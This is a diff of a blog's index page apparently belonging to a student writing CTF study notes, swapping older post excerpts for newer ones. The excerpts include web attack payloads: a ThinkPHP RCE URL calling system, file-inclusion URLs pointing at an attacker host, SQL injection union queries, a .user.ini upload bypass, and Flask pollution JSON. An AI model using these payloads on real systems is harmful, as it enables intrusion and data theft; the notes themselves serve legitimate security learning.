@@ -178,110 +178,43 @@
   <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/26/php%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/" aria-label="php代码阅读"></a>
+      <a class="post-link" href="/2025/05/24/SQL%E6%AD%A5%E9%AA%A4/" aria-label="SQL步骤"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/guanx-fufumi.jpg" data-sizes="auto" alt="php代码阅读" class="lazyload">
+          <img data-src="/covers/妹红02.jpg" data-sizes="auto" alt="SQL步骤" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-26</span>
-        <span><span class="icon-pencil"></span>670 words</span>
-        <span><span class="icon-clock"></span>3 mins</span>
-      </div>
-      <h2 class="post-title">php代码阅读</h2>
-      <article class="post-article">
-        
-          常见代码：1.intval()强制转化为整数
-2.substr($sample,-6,6)  or ($sample,6,6)举例代码
-1.是从倒数第六个开始的最后六个字母
-2.是第六个开始数六个直到第12个
-3.decode/encode类(解码与加密类)1.JSON 解码：json_decode()功能：把 JSON 字符串解码成 PHP 变量
-12345678910&amp;lt;?php$jsonString = &amp;#x27;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;John&amp;quot;, &amp;quot;age&amp;quot;: 30&amp;#125;&amp;#x27;;$phpArray =
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/25/NCTF/" aria-label="NCTF"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E8%BE%89%E5%A4%9C02.jpg" data-sizes="auto" alt="NCTF" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-25</span>
-        <span><span class="icon-pencil"></span>29 words</span>
+        <span><span class="icon-calendar"></span>2025-05-24</span>
+        <span><span class="icon-pencil"></span>165 words</span>
         <span><span class="icon-clock"></span>1 min</span>
       </div>
-      <h2 class="post-title">NCTF</h2>
+      <h2 class="post-title">SQL步骤</h2>
       <article class="post-article">
         
-          很无语当我理解完考察什么东西的时候，nctf已经关闭了
-
-老人，地铁，手机
-
-        
-      </article>
-    </div>
-  </div>
-  </div>
+          步骤：123#1.导入爆破，测试WAF#使用BP测试
 
 
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" aria-label="文件包含"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="/covers/辉夜与妹红.jpg" data-sizes="auto" alt="文件包含" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-24</span>
-        <span><span class="icon-pencil"></span>1.3k words</span>
-        <span><span class="icon-clock"></span>5 mins</span>
-      </div>
-      <h2 class="post-title">文件包含</h2>
-      <article class="post-article">
-        
-          怎么检验存在文件包含：看看是否存在这些函数
-这些函数会将目标文件内容作为PHP代码执行，是最高危的漏洞入口：
-1.执行文件函数(1) include()
-风险：包含并执行指定文件，文件不存在时仅警告。
 
-示例漏洞代码：
-12$file = $_GET[&amp;#x27;file&amp;#x27;];include($file); // 用户可控参数直接传递
+1234567#2.测试包裹1   #无包裹1&amp;#x27;  1&amp;quot;1&amp;#x27;)1&amp;quot;)
 
-利用方式：
-12http://target.com/?file=php://filter/convert.base64-encode/resource=config.phphttp://target.com/?file=http://attacker
+
+
+123456789#3.测试隐藏过滤show database()1;SETorder by 3union select 1，2，3#这些组合起来测试，有可能存在隐藏WAF#有可能双写之类的
+
+
+
+1?id=1&amp;#x27; order by 3--+ 					#进行基础语句测试时候，#不行的时候，可以换成--+试试看
+
+
+
+12345678?id=-1&amp;#x27; union select 1,database(),3
         
       </article>
     </div>
@@ -294,194 +227,27 @@
   <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc/" aria-label="攻防世界-misc"></a>
+      <a class="post-link" href="/2025/05/24/%E8%9C%80%E9%81%93%E5%B1%B12024/" aria-label="蜀道山2024"></a>
     
     
     <div class="post-cover-right">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/sakuya&#39;dagger.jpg" data-sizes="auto" alt="攻防世界-misc" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/sakuya&#39;dagger.jpg" data-sizes="auto" alt="蜀道山2024" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-23</span>
-        <span><span class="icon-pencil"></span>1k words</span>
-        <span><span class="icon-clock"></span>3 mins</span>
-      </div>
-      <h2 class="post-title">攻防世界-misc</h2>
-      <article class="post-article">
-        
-           （我觉得misc确实很有意思，稍微了解一点点吧）
-刷题：Banmabanma：直接在在线扫码即可Barcode Reader. Free Online Web Application
-得到：
-
-适合作为桌面1.解析是否存在隐写我们得到一张照片，在其他wp的建议下我们使用Stegsolve进行
-Stegsolve介绍：Stegsolve 是一款专注于图像隐写分析的工具，常用于 CTF 竞赛、网络安全检测和数字取证场景。它通过深度解析图像的像素和结构，帮助用户发现隐藏在图片中的秘密信息。
-核心功能
-
-通道分析
-支持 RGB（红、绿、蓝）和 Alpha（透明度）通道的独立查看，通过切换不同通道可能
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/" aria-label="攻防世界-web"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="/covers/十六夜咲夜-cute.jpg" data-sizes="auto" alt="攻防世界-web" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-23</span>
-        <span><span class="icon-pencil"></span>7.8k words</span>
-        <span><span class="icon-clock"></span>34 mins</span>
-      </div>
-      <h2 class="post-title">攻防世界-web</h2>
-      <article class="post-article">
-        
-           （在朋友的推荐下，我选择了攻防世界）
-php_rce考察点：ThinkPHP 5.1框架的远程代码执行漏洞（RCE）
-举例子代码：
-1?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
-
-一、原理解析：漏洞是如何触发的？1. 参数拆解
-s=index/\think\app/invokefunction表示调用 think\App 类的 invokefunction 方法。ThinkPHP的路由解析允许通过URL参数直接指定类和方法，这是
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/23/%E4%B8%80%E4%BA%9B%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4/" aria-label="一些查询命令"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/reimu%20and%20marisa.jpg" data-sizes="auto" alt="一些查询命令" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-23</span>
-        <span><span class="icon-pencil"></span>526 words</span>
-        <span><span class="icon-clock"></span>2 mins</span>
-      </div>
-      <h2 class="post-title">一些查询命令</h2>
-      <article class="post-article">
-        
-          查文件：12345cat /(绝对路径) or (相对路径)特殊：查询环境变量：env/proc/self/environ
-
-1print_r(scandir(current(localeconv())));   =  ls
-
-
-
-
-
-123?com=nl /*               读取文件，和cat差不多?com=ls /*               读取子目录 加*区别：没加是单层，加了是全部列出
-
-eg:
-加了:
-
-没加：
-
-找文件:命令结构拆解1. find
-作用: 在文件系统中递归搜索符合条件的文件&amp;#x2F;目录。
-定位: 最强大的文件搜索工具，支持多级过滤。
-
-2. /
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/21/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9BAura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9/" aria-label="Aura酱的礼物"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="/covers/shopping.jpg" data-sizes="auto" alt="Aura酱的礼物" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-21</span>
-        <span><span class="icon-pencil"></span>745 words</span>
-        <span><span class="icon-clock"></span>3 mins</span>
-      </div>
-      <h2 class="post-title">Aura酱的礼物</h2>
-      <article class="post-article">
-        
-          考察什么？ping绕过，伪协议的利用，@绕过
-源码：12345678910111213141516171819202122232425&amp;lt;?phphighlight_file(__FILE__);// Aura 酱，欢迎回家~// 这里有一份礼物，请你签收一下哟~$pen = $_POST[&amp;#x27;pen&amp;#x27;];if (file_get_contents($pen)!== &amp;#x27;Aura&amp;#x27;)&amp;#123;    die(&amp;#x27;这是 Aura 的礼物，你不是 Aura！&amp;#x27;);&amp;#125;// 礼物收到啦，接下来要去博客里面写下感想哦~$challen
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/20/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B/" aria-label="BaseCTF2024新生赛"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/reimu.jpg" data-sizes="auto" alt="BaseCTF2024新生赛" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-20</span>
-        <span><span class="icon-pencil"></span>247 words</span>
+        <span><span class="icon-calendar"></span>2025-05-24</span>
+        <span><span class="icon-pencil"></span>0 words</span>
         <span><span class="icon-clock"></span>1 min</span>
       </div>
-      <h2 class="post-title">BaseCTF2024新生赛</h2>
+      <h2 class="post-title">蜀道山2024</h2>
       <article class="post-article">
         
-          1z_php（简单代码阅读）解题步骤：1.正确输入get请求（这个坑可真的是重量级）12345678910$emp=$_GET[&amp;#x27;e_m.p&amp;#x27;];$try=$_POST[&amp;#x27;try&amp;#x27;];if($emp!=&amp;quot;114514&amp;quot;&amp;amp;&amp;amp;intval($emp,0)===114514)&amp;#123;    for ($i=0;$i&amp;lt;strlen($emp);$i++)&amp;#123;        if (ctype_alpha($emp[$i]))&amp;#123;            die(&amp;quot;你不是hacker？那请去外场
+          
         
       </article>
     </div>
@@ -494,29 +260,33 @@ eg:
   <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/20/BJDCTF2020-The-mystery-of-ip/" aria-label="[BJDCTF2020]The mystery of ip"></a>
+      <a class="post-link" href="/2025/05/24/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/" aria-label="第三届黄河流域公安院校网络安全技能挑战赛"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="/covers/reimu.webp" data-sizes="auto" alt="[BJDCTF2020]The mystery of ip" class="lazyload">
+          <img data-src="/covers/十六夜咲夜-cute.jpg" data-sizes="auto" alt="第三届黄河流域公安院校网络安全技能挑战赛" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-20</span>
-        <span><span class="icon-pencil"></span>227 words</span>
-        <span><span class="icon-clock"></span>1 min</span>
+        <span><span class="icon-calendar"></span>2025-05-24</span>
+        <span><span class="icon-pencil"></span>799 words</span>
+        <span><span class="icon-clock"></span>3 mins</span>
       </div>
-      <h2 class="post-title">[BJDCTF2020]The mystery of ip</h2>
+      <h2 class="post-title">第三届黄河流域公安院校网络安全技能挑战赛</h2>
       <article class="post-article">
         
-          [BJDCTF2020]The mystery of ip考察什么？ip伪造，ssti注入
-题目：hint提醒我们ip，我们尝试伪造ip，下面是伪造ip的几种方式：
-12345678910111213141516171819Client-IP: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1Forwarded-For: localhostX-Forwarded-For-Original:127.0.0.1X-Forwarded-For-Original: localhostX-Forwarded-For: 127.0.0.1X-For
+          奶龙牌图片处理器2.01.看上去像是文件上传，测试一下过滤：
+过滤：
+12php					 #无论大小写&amp;lt;?
+
+发现.use.ini可以上传
+补充：.use.ini怎么用当我们上传的.use.ini文件有如下内容：
+123456789在我们可以上传php文件时候使用：GIF89a                  	//绕过exif_imagetype()auto_prepend_file=a.jpg 	//指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函							数调用它一样。它包含在所有php文件前先执行auto_append_file=a.jpg  
         
       </article>
     </div>
@@ -529,33 +299,245 @@ eg:
   <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/19/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/" aria-label="[网鼎杯 2020 朱雀组]phpweb"></a>
+      <a class="post-link" href="/2025/05/19/%E5%86%8D%E6%8E%A2BUU-MISC/" aria-label="再探BUU-MISC"></a>
     
     
     <div class="post-cover-right">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/shopping.jpg" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]phpweb" class="lazyload">
+          <img data-src="/covers/molisha.jpg" data-sizes="auto" alt="再探BUU-MISC" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-19</span>
-        <span><span class="icon-pencil"></span>708 words</span>
-        <span><span class="icon-clock"></span>3 mins</span>
+        <span><span class="icon-calendar"></span>2025-05-19</span>
+        <span><span class="icon-pencil"></span>372 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
       </div>
-      <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
+      <h2 class="post-title">再探BUU-MISC</h2>
       <article class="post-article">
         
-          [网鼎杯 2020 朱雀组]phpweb其实最开始我是觉得应该是抓包的，但是意识不够好，不知道post传输里面就是我们想要的敲门砖
-含泪看wp抓包，post运输有鬼
+          金三胖使用GIF分割网站：将 GIF 图像分割成帧（记得翻墙）
 
-第一个考点：去搜才知道这是Linux的date看日期函数，于是我们便尝试读取源文件：
+一个个找
+二维码：打开Barcode Reader. Free Online Web Application来扫描
 
-得到：
-123456789101112131415161718192021222324252627282930&amp;lt;?php    $disable_fun = array(&amp;quot;exec&amp;quot;,&amp;quot;shell_exec&amp;quot;,&amp;quot;system&amp;quot;,&amp;quot;passthru&amp;quot;,&amp;quo
+发现里面什么都没有
+查看十六进制：（使用VScode）1.在左边打开文件夹选择图片
+2.选择十六进制：
+3.查看：
+发现存在一个txt文件？
+4.尝试改名为txt文件
+没有用，那就改为zip
+5.使用binwalk
+发现确实存在，那就提取出来：
+123dd if=&amp;#x27;/home/flitar/桌面/MISC/二维码 .jpg&amp;#x27; bs=1 skip=471 count=201 of=111.zip
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/19/%E8%BD%A9%E8%BE%95%E6%9D%AF/" aria-label="轩辕杯"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/covers/hezhao 02.jpg" data-sizes="auto" alt="轩辕杯" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-19</span>
+        <span><span class="icon-pencil"></span>2.9k words</span>
+        <span><span class="icon-clock"></span>15 mins</span>
+      </div>
+      <h2 class="post-title">轩辕杯</h2>
+      <article class="post-article">
+        
+          测试：web：WEBezrce考察点：call_user_func本质利用源码：
+123456789101112131415161718192021222324252627282930313233343536373839404142434445 &amp;lt;?phperror_reporting(0);highlight_file(__FILE__);function waf($a) &amp;#123;    $disable_fun = array(        &amp;quot;exec&amp;quot;, &amp;quot;shell_exec&amp;quot;, &amp;quot;system&amp;quot;, &amp;quot;p
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/18/SCTF/" aria-label="SCTF"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/covers/十六夜咲夜-cute.jpg" data-sizes="auto" alt="SCTF" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-18</span>
+        <span><span class="icon-pencil"></span>0 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">SCTF</h2>
+      <article class="post-article">
+        
+          
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/15/Python/" aria-label="Python"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/covers/红美铃.jpg" data-sizes="auto" alt="Python" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-15</span>
+        <span><span class="icon-pencil"></span>13 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">Python</h2>
+      <article class="post-article">
+        
+          我觉得我需要学习pythonDay-1学习点：
+
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/11/%E6%B1%A1%E6%9F%93%E9%A2%98/" aria-label="污染题"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/covers/辉夜02.jpg" data-sizes="auto" alt="污染题" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-11</span>
+        <span><span class="icon-pencil"></span>76 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">污染题</h2>
+      <article class="post-article">
+        
+          12345678污染让他可以文件读取：&amp;#123;&amp;quot;__globals__&amp;quot;:&amp;#123;&amp;quot;app&amp;quot;:&amp;#123;&amp;quot;_static_folder&amp;quot;:&amp;quot;/&amp;quot;&amp;#125;&amp;#125;&amp;#125;污染黑名单：&amp;#123;&amp;quot;__globals__&amp;quot; : &amp;#123;&amp;quot;param_black_list&amp;quot; : [&amp;quot;123&amp;quot;]&amp;#125;&amp;#125;污染密钥来伪造：&amp;#123;&amp;quot;__globals__&amp;quot; : &amp;#123;&amp;quot;app&amp;quot;
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/06/KPctf/" aria-label="KPctf"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/covers/togele.jpg" data-sizes="auto" alt="KPctf" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-06</span>
+        <span><span class="icon-pencil"></span>53 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">KPctf</h2>
+      <article class="post-article">
+        
+          总决赛[where is the flag]12345678910 &amp;lt;?phplibxml_disable_entity_loader(false);$data = file_get_contents(&amp;quot;php://input&amp;quot;);$xml = simplexml_load_string($data,&amp;#x27;SimpleXMLElement&amp;#x27;, LIBXML_NOENT);if (isset($xml-&amp;gt;username)) &amp;#123;    echo $xml-&amp;gt;username;&amp;#125; else &amp;#123;    show_so
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/05/05/GitHack/" aria-label="GitHack"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/sakuya%20looking%20back.jpg" data-sizes="auto" alt="GitHack" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-05-05</span>
+        <span><span class="icon-pencil"></span>28 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">GitHack</h2>
+      <article class="post-article">
+        
+          使用指令：1githacker --url 靶场的URL.git --output-folder 要保存的文件名
+
+
+要在这个文件夹下
+
         
       </article>
     </div>
@@ -568,7 +550,7 @@ eg:
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 
@@ -586,7 +568,7 @@ eg:
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">44</div>
+    <div class="sidebar-state-number">69</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -659,10 +641,10 @@ eg:
     
       <div>
         <span class="icon-brush"></span>
-        40.8k
+        65.1k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        03:03
+        05:01
       </div>
     
     
@@ -696,7 +678,7 @@ eg:
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">44</div>
+    <div class="sidebar-state-number">69</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
